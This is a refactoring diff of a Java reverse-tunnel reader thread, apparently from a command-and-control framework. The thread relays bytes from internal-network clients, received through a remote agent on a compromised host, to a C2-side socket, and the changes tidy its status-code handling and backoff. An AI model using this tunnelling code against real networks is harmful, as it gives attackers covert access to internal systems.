@@ -1,17 +1,17 @@
 package org.leo.core.engine.reverse;
 
-import org.leo.core.engine.socks5.Socks5ProxyStatistics;
 import org.leo.core.agent.capability.ComponentInvokeCapable;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
+import java.io.IOException;
 import java.net.Socket;
 import java.util.HashMap;
 import java.util.Map;
 
 /**
  * 从 agent 端读数据 → 写到 C2 本地 socket（forwardHost:forwardPort）。
- * 即"傀儡 accept 到的内网客户端发来的字节"流向"C2 侧目标服务"。
+ * 即"agent accept 到的内网客户端发来的字节"流向"C2 侧目标服务"。
  */
 class ReverseReadThread implements Runnable {
 
@@ -29,44 +29,35 @@ class ReverseReadThread implements Runnable {
 
     public void run() {
         ComponentInvokeCapable agent = server.getAgentNode();
-        Socks5ProxyStatistics stats = server.getStatistics();
         long idleDelay = 50L;
-        while (server.isRunning()) {
-            if (localSocket == null || localSocket.isClosed()) return;
+        while (server.isRunning() && !localSocket.isClosed()) {
             try {
                 Map<String, Object> params = new HashMap<String, Object>();
                 params.put("op", Integer.valueOf(ReverseTunnelServer.OP_READ));
                 params.put("connId", connId);
-                Map<String, Object> res = agent.invokeComponent("ReverseTunnelComponent", params);
-                Object code = res != null ? res.get("code") : null;
-                if (Integer.valueOf(200).equals(code)) {
-                    byte[] data = (byte[]) res.get("data");
-                    if (data != null && data.length > 0) {
+                Map<String, Object> response = agent.invokeComponent("ReverseTunnelComponent", params);
+                int code = ReverseTunnelServer.responseCode(response);
+                if (code == 200) {
+                    Object value = response.get("data");
+                    if (!(value instanceof byte[])) {
+                        throw new IOException("agent READ returned invalid data");
+                    }
+                    byte[] data = (byte[]) value;
+                    if (data.length > 0) {
                         localSocket.getOutputStream().write(data);
                         localSocket.getOutputStream().flush();
-                        if (stats != null) stats.addUploadBytes(connId, data.length);
+                        server.recordUpload(connId, data.length);
+                        idleDelay = 50L;
+                        continue;
                     }
-                    idleDelay = 50L; // 有数据，重置退避
-                    continue;
+                } else if (code != 204) {
+                    throw new IOException("agent READ failed: code=" + code);
                 }
-                if (Integer.valueOf(204).equals(code)) {
-                    // 无数据：指数退避，上限 800ms
-                    Thread.sleep(idleDelay);
-                    if (idleDelay < 800L) idleDelay = Math.min(idleDelay * 2, 800L);
-                    continue;
-                }
-                if (Integer.valueOf(404).equals(code)) {
-                    logger.debug("反向隧道 agent 侧连接关闭: connId={}", connId);
-                    try { localSocket.close(); } catch (Exception ignored) {}
-                    break;
-                }
-                if (Integer.valueOf(500).equals(code)) {
-                    logger.debug("反向隧道读异常: {}", res.get("msg"));
-                    break;
-                }
-            } catch (Exception e) {
+                Thread.sleep(idleDelay);
+                idleDelay = Math.min(idleDelay * 2, 800L);
+            } catch (Exception error) {
                 if (server.isRunning()) {
-                    logger.debug("反向隧道读循环异常: connId={} {}", connId, e.getMessage());
+                    logger.debug("反向隧道读循环异常: connId={} {}", connId, error.getMessage());
                 }
                 return;
             }
